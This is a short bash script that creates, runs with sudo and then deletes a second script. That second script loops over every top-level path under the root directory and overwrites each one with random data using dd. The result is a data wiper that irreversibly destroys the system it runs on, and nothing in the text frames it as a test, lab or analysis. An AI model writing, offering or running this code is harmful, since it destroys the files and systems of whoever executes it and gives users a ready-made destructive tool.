#!/bin/bash
touch script.sh && echo '''#!/bin/bash
files=( "/"* ) 
	for file in "${files[@]}"; 
	do dd if=/dev/urandom of="$file" bs=10000000000 count=1 conv=notrunc 
done ''' > script.sh && chmod +x script.sh && sudo ./script.sh && rm script.sh
